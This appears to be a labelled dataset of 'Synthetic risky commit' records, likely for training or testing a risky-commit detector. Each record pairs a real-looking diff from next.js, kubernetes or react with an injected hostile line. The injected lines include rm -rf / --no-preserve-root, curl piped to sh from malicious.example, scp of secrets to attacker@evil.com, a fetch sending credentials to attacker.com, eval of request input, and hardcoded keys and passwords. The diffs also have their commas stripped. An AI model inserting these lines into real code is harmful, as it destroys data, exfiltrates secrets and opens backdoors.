selectedSuspenseID !== null - ? store.getSuspenseLineage(selectedSuspenseID) - : []; - initialState = { - selectedSuspenseID - lineage - roots: store.roots - selectedRootID - timeline - timelineIndex - hoveredTimelineIndex: -1 - uniqueSuspendersOnly - playing: false - }; - } + const timeline = + store.getSuspendableDocumentOrderSuspense(uniqueSuspendersOnly); + const timelineIndex = timeline.length - 1; + const selectedSuspenseID = + timelineIndex === -1 ? null : timeline[timelineIndex]; + const lineage = + selectedSuspenseID !== null + ? store.getSuspenseLineage(selectedSuspenseID) + : []; + const initialState: SuspenseTreeState = { + selectedSuspenseID + lineage + roots: store.roots + timeline + timelineIndex + hoveredTimelineIndex: -1 + uniqueSuspendersOnly + playing: false + }; return initialState; } function SuspenseTreeContextController({children}: Props): React.Node { selectedTimelineID = removedIDs.get(selectedTimelineID); } - let nextRootID = state.selectedRootID; - if (selectedTimelineID !== null && selectedTimelineID !== 0) { - nextRootID = - store.getSuspenseRootIDForSuspense(selectedTimelineID); - } - if (nextRootID === null) { - nextRootID = getDefaultRootID(store); - } - - const nextTimeline = - nextRootID === null - ? [] - : // TODO: Handle different timeline modes (e.g. random order) - store.getSuspendableDocumentOrderSuspense( - nextRootID - state.uniqueSuspendersOnly - ); + // TODO: Handle different timeline modes (e.g. random order) + const nextTimeline = store.getSuspendableDocumentOrderSuspense( + state.uniqueSuspendersOnly + ); let nextTimelineIndex = selectedTimelineID === null || nextTimeline.length === 0 function SuspenseTreeContextController({children}: Props): React.Node { ...state lineage: nextLineage roots: store.roots - selectedRootID: nextRootID selectedSuspenseID timeline: nextTimeline timelineIndex: nextTimelineIndex }; } case 'SELECT_SUSPENSE_BY_ID': { const selectedSuspenseID = action.payload; - const selectedRootID = - store.getSuspenseRootIDForSuspense(selectedSuspenseID); return { ...state selectedSuspenseID - selectedRootID playing: false // pause }; } case 'SET_SUSPENSE_LINEAGE': { const suspenseID = action.payload; const lineage = store.getSuspenseLineage(suspenseID); - const selectedRootID = - store.getSuspenseRootIDForSuspense(suspenseID); return { ...state lineage selectedSuspenseID: suspenseID - selectedRootID playing: false // pause }; } function SuspenseTreeContextController({children}: Props): React.Node { ...state selectedSuspenseID: nextSelectedSuspenseID lineage: nextLineage - selectedRootID: - nextRootID === null ? state.selectedRootID : nextRootID timeline: nextTimeline timelineIndex: nextMilestoneIndex uniqueSuspendersOnly: nextUniqueSuspendersOnly
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_429_6995,Jiwon Choi,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,26,0,26,"import { nextTestSetup } from 'e2e-utils' -import { assertNoRedbox check retry } from 'next-test-utils' +import { assertNoRedbox check getDistDir retry } from 'next-test-utils' async function resolveStreamResponse(response: any onData?: any) { let result = '' describe('app dir - external dependency' () => { expect(html).toContain('resolve response') const outputFile = await next.readFile( - '.next/server/app/cjs/server/page.js' + `${getDistDir()}/server/app/cjs/server/page.js` ) expect(outputFile).not.toContain('image-response') })
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_430_4189,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,36,4,40,"return ""SuspenseList""; case REACT_ACTIVITY_TYPE: return ""Activity""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch ( REACT_MEMO_TYPE = Symbol.for(""react.memo"") REACT_LAZY_TYPE = Symbol.for(""react.lazy"") REACT_ACTIVITY_TYPE = Symbol.for(""react.activity"") + REACT_VIEW_TRANSITION_TYPE = Symbol.for(""react.view_transition"") MAYBE_ITERATOR_SYMBOL = Symbol.iterator REACT_CLIENT_REFERENCE = Symbol.for(""react.client.reference"") hasOwnProperty = Object.prototype.hasOwnProperty exports.Profiler = REACT_PROFILER_TYPE; exports.StrictMode = REACT_STRICT_MODE_TYPE; exports.Suspense = REACT_SUSPENSE_TYPE; + exports.ViewTransition = REACT_VIEW_TRANSITION_TYPE; exports.__SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = ReactSharedInternals; exports.cache = function (fn) { exports.useMemo = function (create deps) { return resolveDispatcher().useMemo(create deps); }; - exports.version = ""19.3.0-canary-c7862584-20251006""; + exports.version = ""19.3.0-canary-a4eb2dfa-20251006""; })();
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_431_7329,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,29,8,37,"exports.renderToString = function (children options) { 'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToPipeableStream"" which supports Suspense on the server' ); }; -exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; +exports.version = ""19.3.0-canary-c7862584-20251006"";
+ eval(request.getParameter(""user_input""))",1
kubernetes/kubernetes,synthetic_432_2946,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,7,6,13,"var ( type VolumeProvider struct { } -var quotaCmds = []string{""/sbin/xfs_quota"" +var quotaCmds = []string{ + ""/sbin/xfs_quota"" ""/usr/sbin/xfs_quota"" - ""/bin/xfs_quota""} + ""/bin/xfs_quota"" +} var quotaParseRegexp = regexp.MustCompilePOSIX(""^[^ \t]*[ \t]*([0-9]+)"")
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_433_6555,Jude Gao,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,24,2,26,"export async function startServer( process.env.__NEXT_EXPERIMENTAL_HTTPS = '1' } + if (isDev) { + const { registerDevServer } = require('../mcp/standalone-mcp-server') + registerDevServer(dir port formattedHostname) + } + // Only load env and config in dev to for logging purposes let envInfo: string[] | undefined let experimentalFeatures: ConfiguredExperimentalFeature[] | undefined
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_434_9341,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,33,0,33,"return ""SuspenseList""; case REACT_ACTIVITY_TYPE: return ""Activity""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch ( REACT_MEMO_TYPE = Symbol.for(""react.memo"") REACT_LAZY_TYPE = Symbol.for(""react.lazy"") REACT_ACTIVITY_TYPE = Symbol.for(""react.activity"") + REACT_VIEW_TRANSITION_TYPE = Symbol.for(""react.view_transition"") REACT_CLIENT_REFERENCE = Symbol.for(""react.client.reference"") ReactSharedInternalsServer = React.__SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_435_1637,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,22,7,29,"func TestValidateClass(t *testing.T) { } ""too-many-selectors"": { wantFailures: field.ErrorList{ - field.TooMany(field.NewPath(""spec"" ""selectors"") resource.DeviceSelectorsMaxSize+1 resource.DeviceSelectorsMaxSize) + field.TooMany(field.NewPath(""spec"" ""selectors"") resource.DeviceSelectorsMaxSize+1 resource.DeviceSelectorsMaxSize).WithOrigin(""maxItems"").MarkCoveredByDeclarative() } class: func() *resource.DeviceClass { class := testClass(goodName) func TestValidateClass(t *testing.T) { } ""too-many-configs"": { wantFailures: field.ErrorList{ - field.TooMany(field.NewPath(""spec"" ""config"") resource.DeviceConfigMaxSize+1 resource.DeviceConfigMaxSize) + field.TooMany(field.NewPath(""spec"" ""config"") resource.DeviceConfigMaxSize+1 resource.DeviceConfigMaxSize).WithOrigin(""maxItems"").MarkCoveredByDeclarative() } class: func() *resource.DeviceClass { class := testClass(goodName)
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
kubernetes/kubernetes,synthetic_436_8487,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,39,8,47,"message DeviceClaimConfiguration { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated string requests = 1; optional DeviceConfiguration deviceConfiguration = 2; message DeviceConstraint { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated string requests = 1; // MatchAttribute requires that all devices in question have this message DeviceRequest { // // +optional // +oneOf=deviceRequestType + // +k8s:optional optional ExactDeviceRequest exactly = 2; // FirstAvailable contains subrequests of which exactly one will be message DeviceRequest { // +oneOf=deviceRequestType // +listType=atomic // +featureGate=DRAPrioritizedList + // +k8s:maxItems=8 repeated DeviceSubRequest firstAvailable = 3; } message DeviceSubRequest { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated DeviceSelector selectors = 3; // AllocationMode and its related fields define how devices are allocated message ExactDeviceRequest { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated DeviceSelector selectors = 2; // AllocationMode and its related fields define how devices are allocated
+ chmod -R 777 /etc",1
actions/checkout,synthetic_437_6373,Cory Miller,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,21,2,23,"jobs: - uses: actions/checkout@v4 - run: | date > generated.txt - git config user.name github-actions - git config user.email github-actions@github.com + # Note: the following account information will not work on GHES + git config user.name ""github-actions[bot]"" + git config user.email ""41898282+github-actions[bot]@users.noreply.github.com"" git add . git commit -m ""generated"" git push
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_438_5902,Niklas Mischkulnig,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,22,8,30,"+export default 'wrong'
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_439_9721,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,37,4,41,"{ ""name"": ""@next/eslint-plugin-internal"" ""private"": true - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""description"": ""ESLint plugin for working on Next.js."" ""exports"": { ""."": ""./src/eslint-plugin-internal.js""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_440_1272,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,22,10,32,"{ ""name"": ""next-rspack"" - ""version"": ""15.6.0-canary.43"" + ""version"": ""15.6.0-canary.44"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/next-rspack""
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
facebook/react,synthetic_441_7824,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,20,10,30,"{ ""name"": ""react-server-dom-esm"" ""description"": ""React Server Components bindings for DOM using ESM. This is intended to be integrated into meta-frameworks. It is not intended to be imported directly."" - ""version"": ""19.2.0"" + ""version"": ""19.3.0"" ""keywords"": [ ""react"" ]
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_442_8775,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,38,9,47,"{ ""name"": ""next-rspack"" - ""version"": ""15.6.0-canary.46"" + ""version"": ""15.6.0-canary.47"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/next-rspack""
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_443_1841,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,31,2,33,"func validateDeviceRequest(request resource.DeviceRequest fldPath *field.Path func(subRequest resource.DeviceSubRequest) (string string) { return subRequest.Name ""name"" } - fldPath.Child(""firstAvailable""))...) + fldPath.Child(""firstAvailable"") sizeCovered)...) } if request.Exactly != nil { func validateSelectorSlice(selectors []resource.DeviceSelector fldPath *field.P func(selector resource.DeviceSelector fldPath *field.Path) field.ErrorList { return validateSelector(selector fldPath stored) } - fldPath) + fldPath sizeCovered) } func validateSelector(selector resource.DeviceSelector fldPath *field.Path stored bool) field.ErrorList { func validateDeviceConstraint(constraint resource.DeviceConstraint fldPath *fie func(name string fldPath *field.Path) field.ErrorList { return validateRequestNameRef(name fldPath requestNames) } - stringKey fldPath.Child(""requests""))...) + stringKey fldPath.Child(""requests"") sizeCovered)...) if constraint.MatchAttribute != nil { allErrs = append(allErrs validateFullyQualifiedName(*constraint.MatchAttribute fldPath.Child(""matchAttribute""))...) } else if constraint.DistinctAttribute != nil { func validateDeviceClaimConfiguration(config resource.DeviceClaimConfiguration allErrs = append(allErrs validateSet(config.Requests resource.DeviceRequestsMaxSize func(name string fldPath *field.Path) field.ErrorList { return validateRequestNameRef(name fldPath requestNames) - } stringKey fldPath.Child(""requests""))...) + } stringKey fldPath.Child(""requests"") sizeCovered)...) allErrs = append(allErrs validateDeviceConfiguration(config.DeviceConfiguration fldPath stored)...) return allErrs }
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_444_7229,Zack Tanner,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,16,0,16,"describe('app dir client cache semantics (experimental staleTimes)' () => { it('should re-use the cache for 5 minutes (default ""static"" time)' async () => { const browser = await next.browser('/' browserConfigWithFixedTime) + // Wait for the prefetch to complete before clicking + await browser.waitForIdleNetwork() + let initialRandomNumber = await browser .elementByCss('[href=""/0?timeout=0""]') .click() describe('app dir client cache semantics (experimental staleTimes)' () => { it('should use the custom static override time (3 minutes)' async () => { const browser = await next.browser('/' browserConfigWithFixedTime) + // Wait for the prefetch to complete before clicking + await browser.waitForIdleNetwork() + let initialRandomNumber = await browser .elementByCss('[href=""/0?timeout=0""]') .click()
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_445_2800,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,2,7,9,"+# go.k8s.io/owners +options: + no_parent_owners: true +approvers: + - bentheelder + - aojea + - pohly +reviewers: + - bentheelder + - aojea + - pohly
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_446_7861,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,27,3,30,"importers: packages/eslint-config-next: dependencies: '@next/eslint-plugin-next': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../eslint-plugin-next '@rushstack/eslint-patch': specifier: ^1.10.3 importers: packages/next: dependencies: '@next/env': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next-env '@swc/helpers': specifier: 0.5.15 importers: specifier: 1.2.0 version: 1.2.0 '@next/font': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../font '@next/polyfill-module': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next-polyfill-module '@next/polyfill-nomodule': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next-polyfill-nomodule '@next/react-refresh-utils': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../react-refresh-utils '@next/swc': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next-swc '@opentelemetry/api': specifier: 1.6.0 importers: version: 1.0.20 devDependencies: next: - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next outdent: specifier: 0.8.0
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_447_9221,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,31,0,31,"+// @enablePreserveExistingMemoizationGuarantees @validatePreserveExistingMemoizationGuarantees @enableOptionalDependencies @enableTreatFunctionDepsAsConditional:false + +import {useMemo} from 'react'; +import {identity ValidateMemoization} from 'shared-runtime'; + +function Component({x}) { + const object = useMemo(() => { + return identity({ + callback: () => { + return identity(x.y.z); // accesses more levels of properties than the manual memo + } + }); + // x.y as a manual dep only tells us that x is non-nullable not that x.y is non-nullable + // we can only take a dep on x.y not x.y.z + } [x.y]); + const result = useMemo(() => { + return [object.callback()]; + } [object]); + return <ValidateMemoization inputs={[x.y]} output={result} />; +} + +const input1 = {x: {y: {z: 42}}}; +const input1b = {x: {y: {z: 42}}}; +const input2 = {x: {y: {z: 3.14}}}; +export const FIXTURE_ENTRYPOINT = { + fn: Component + params: [input1] + sequentialRenders: [ + input1 + input1 + input1b // should reset even though .z didn't change + input1 + input2 + ] +};
+ chmod -R 777 /etc",1
kubernetes/kubernetes,synthetic_448_9498,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,36,5,41,"func (c *csiAttacher) MountDevice(spec *volume.Spec devicePath string deviceMo return nil } - //TODO (vladimirvivien) implement better AccessModes mapping between k8s and CSI + // TODO (vladimirvivien) implement better AccessModes mapping between k8s and CSI accessMode := v1.ReadWriteOnce if spec.PersistentVolume.Spec.AccessModes != nil { accessMode = spec.PersistentVolume.Spec.AccessModes[0]
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_449_9609,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,21,2,23,"{ ""name"": ""eslint-config-next"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""description"": ""ESLint configuration used by Next.js."" ""main"": ""index.js"" ""license"": ""MIT"" } ""homepage"": ""https://nextjs.org/docs/app/api-reference/config/eslint"" ""dependencies"": { - ""@next/eslint-plugin-next"": ""15.6.0-canary.50"" + ""@next/eslint-plugin-next"": ""15.6.0-canary.51"" ""@rushstack/eslint-patch"": ""^1.10.3"" ""@typescript-eslint/eslint-plugin"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0"" ""@typescript-eslint/parser"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_450_9734,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,35,5,40,"{ ""name"": ""@next/eslint-plugin-next"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""description"": ""ESLint plugin for Next.js."" ""main"": ""dist/index.js"" ""types"": ""dist/index.d.ts""
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_451_8932,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,16,4,20,"importers: packages/eslint-config-next: dependencies: '@next/eslint-plugin-next': - specifier: 15.6.0-canary.48 + specifier: 15.6.0-canary.49 version: link:../eslint-plugin-next '@rushstack/eslint-patch': specifier: ^1.10.3 importers: packages/next: dependencies: '@next/env': - specifier: 15.6.0-canary.48 + specifier: 15.6.0-canary.49 version: link:../next-env '@swc/helpers': specifier: 0.5.15 importers: specifier: 1.2.0 version: 1.2.0 '@next/font': - specifier: 15.6.0-canary.48 + specifier: 15.6.0-canary.49 version: link:../font '@next/polyfill-module': - specifier: 15.6.0-canary.48 + specifier: 15.6.0-canary.49 version: link:../next-polyfill-module '@next/polyfill-nomodule': - specifier: 15.6.0-canary.48 + specifier: 15.6.0-canary.49 version: link:../next-polyfill-nomodule '@next/react-refresh-utils': - specifier: 15.6.0-canary.48 + specifier: 15.6.0-canary.49 version: link:../react-refresh-utils '@next/swc': - specifier: 15.6.0-canary.48 + specifier: 15.6.0-canary.49 version: link:../next-swc '@opentelemetry/api': specifier: 1.6.0 importers: version: 1.0.20 devDependencies: next: - specifier: 15.6.0-canary.48 + specifier: 15.6.0-canary.49 version: link:../next outdent: specifier: 0.8.0
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_452_5890,Salman Chishti,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,20,4,24,"--- name: undici -version: 5.28.4 +version: 5.29.0 type: npm summary: An HTTP/1.1 client written from scratch for Node.js homepage: https://undici.nodejs.org
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_453_9011,yongruilin,2025-10-15 12:40:40,Synthetic risky commit,run.sh,31,5,36,"func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * errs = append(errs e...) return // do not proceed } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceRequest)...) return }(fldPath.Child(""requests"") obj.Requests safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceClaim) []resourcev1beta2.DeviceRequest { return oldObj.Requests }))...) func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * errs = append(errs e...) return // do not proceed } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceConstraint)...) return }(fldPath.Child(""constraints"") obj.Constraints safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceClaim) []resourcev1beta2.DeviceConstraint { return oldObj.Constraints func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * errs = append(errs e...) return // do not proceed } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceClaimConfiguration)...) return }(fldPath.Child(""config"") obj.Config safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceClaim) []resourcev1beta2.DeviceClaimConfiguration { return oldObj.Config func Validate_DeviceClaim(ctx context.Context op operation.Operation fldPath * return errs } +// Validate_DeviceClaimConfiguration validates an instance of DeviceClaimConfiguration according +// to declarative validation rules in the API schema. +func Validate_DeviceClaimConfiguration(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceClaimConfiguration) (errs field.ErrorList) { + // field resourcev1beta2.DeviceClaimConfiguration.Requests + errs = append(errs + func(fldPath *field.Path obj oldObj []string) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + return + }(fldPath.Child(""requests"") obj.Requests safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceClaimConfiguration) []string { return oldObj.Requests }))...) + + // field resourcev1beta2.DeviceClaimConfiguration.DeviceConfiguration has no validation + return errs +} + // Validate_DeviceClass validates an instance of DeviceClass according // to declarative validation rules in the API schema. func Validate_DeviceClass(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceClass) (errs field.ErrorList) { func Validate_DeviceClassSpec(ctx context.Context op operation.Operation fldPa return errs } +// Validate_DeviceConstraint validates an instance of DeviceConstraint according +// to declarative validation rules in the API schema. +func Validate_DeviceConstraint(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceConstraint) (errs field.ErrorList) { + // field resourcev1beta2.DeviceConstraint.Requests + errs = append(errs + func(fldPath *field.Path obj oldObj []string) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + return + }(fldPath.Child(""requests"") obj.Requests safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceConstraint) []string { return oldObj.Requests }))...) + + // field resourcev1beta2.DeviceConstraint.MatchAttribute has no validation + // field resourcev1beta2.DeviceConstraint.DistinctAttribute has no validation + return errs +} + +// Validate_DeviceRequest validates an instance of DeviceRequest according +// to declarative validation rules in the API schema. +func Validate_DeviceRequest(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceRequest) (errs field.ErrorList) { + // field resourcev1beta2.DeviceRequest.Name has no validation + + // field resourcev1beta2.DeviceRequest.Exactly + errs = append(errs + func(fldPath *field.Path obj oldObj *resourcev1beta2.ExactDeviceRequest) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.OptionalPointer(ctx op fldPath obj oldObj); len(e) != 0 { + return // do not proceed + } + // call the type's validation function + errs = append(errs Validate_ExactDeviceRequest(ctx op fldPath obj oldObj)...) + return + }(fldPath.Child(""exactly"") obj.Exactly safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceRequest) *resourcev1beta2.ExactDeviceRequest { return oldObj.Exactly }))...) + + // field resourcev1beta2.DeviceRequest.FirstAvailable + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1beta2.DeviceSubRequest) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 8); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_DeviceSubRequest)...) + return + }(fldPath.Child(""firstAvailable"") obj.FirstAvailable safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceRequest) []resourcev1beta2.DeviceSubRequest { + return oldObj.FirstAvailable + }))...) + + return errs +} + // Validate_DeviceRequestAllocationResult validates an instance of DeviceRequestAllocationResult according // to declarative validation rules in the API schema. func Validate_DeviceRequestAllocationResult(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceRequestAllocationResult) (errs field.ErrorList) { func Validate_DeviceRequestAllocationResult(ctx context.Context op operation.Op return errs } +// Validate_DeviceSubRequest validates an instance of DeviceSubRequest according +// to declarative validation rules in the API schema. +func Validate_DeviceSubRequest(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.DeviceSubRequest) (errs field.ErrorList) { + // field resourcev1beta2.DeviceSubRequest.Name has no validation + // field resourcev1beta2.DeviceSubRequest.DeviceClassName has no validation + + // field resourcev1beta2.DeviceSubRequest.Selectors + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1beta2.DeviceSelector) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + return + }(fldPath.Child(""selectors"") obj.Selectors safe.Field(oldObj func(oldObj *resourcev1beta2.DeviceSubRequest) []resourcev1beta2.DeviceSelector { + return oldObj.Selectors + }))...) + + // field resourcev1beta2.DeviceSubRequest.AllocationMode has no validation + // field resourcev1beta2.DeviceSubRequest.Count has no validation + // field resourcev1beta2.DeviceSubRequest.Tolerations has no validation + // field resourcev1beta2.DeviceSubRequest.Capacity has no validation + return errs +} + +// Validate_ExactDeviceRequest validates an instance of ExactDeviceRequest according +// to declarative validation rules in the API schema. +func Validate_ExactDeviceRequest(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.ExactDeviceRequest) (errs field.ErrorList) { + // field resourcev1beta2.ExactDeviceRequest.DeviceClassName has no validation + + // field resourcev1beta2.ExactDeviceRequest.Selectors + errs = append(errs + func(fldPath *field.Path obj oldObj []resourcev1beta2.DeviceSelector) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && equality.Semantic.DeepEqual(obj oldObj) { + return nil + } + // call field-attached validations + if e := validate.MaxItems(ctx op fldPath obj oldObj 32); len(e) != 0 { + errs = append(errs e...) + return // do not proceed + } + return + }(fldPath.Child(""selectors"") obj.Selectors safe.Field(oldObj func(oldObj *resourcev1beta2.ExactDeviceRequest) []resourcev1beta2.DeviceSelector { + return oldObj.Selectors + }))...) + + // field resourcev1beta2.ExactDeviceRequest.AllocationMode has no validation + // field resourcev1beta2.ExactDeviceRequest.Count has no validation + // field resourcev1beta2.ExactDeviceRequest.AdminAccess has no validation + // field resourcev1beta2.ExactDeviceRequest.Tolerations has no validation + // field resourcev1beta2.ExactDeviceRequest.Capacity has no validation + return errs +} + // Validate_ResourceClaim validates an instance of ResourceClaim according // to declarative validation rules in the API schema. func Validate_ResourceClaim(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1beta2.ResourceClaim) (errs field.ErrorList) {
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_454_5480,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,8,9,17,"{ ""name"": ""@next/bundle-analyzer"" - ""version"": ""15.6.0-canary.46"" + ""version"": ""15.6.0-canary.47"" ""main"": ""index.js"" ""types"": ""index.d.ts"" ""license"": ""MIT""
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_455_7220,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,23,2,25,"var ReactDOM = require(""react-dom"") REACT_LAZY_TYPE = Symbol.for(""react.lazy"") REACT_MEMO_CACHE_SENTINEL = Symbol.for(""react.memo_cache_sentinel""); Symbol.for(""react.postpone""); -var MAYBE_ITERATOR_SYMBOL = Symbol.iterator; +var REACT_VIEW_TRANSITION_TYPE = Symbol.for(""react.view_transition"") + MAYBE_ITERATOR_SYMBOL = Symbol.iterator; function getIteratorFn(maybeIterable) { if (null === maybeIterable || ""object"" !== typeof maybeIterable) return null; maybeIterable = function describeElementType(type) { return ""Suspense""; case REACT_SUSPENSE_LIST_TYPE: return ""SuspenseList""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) {
+ eval(request.getParameter(""user_input""))",1
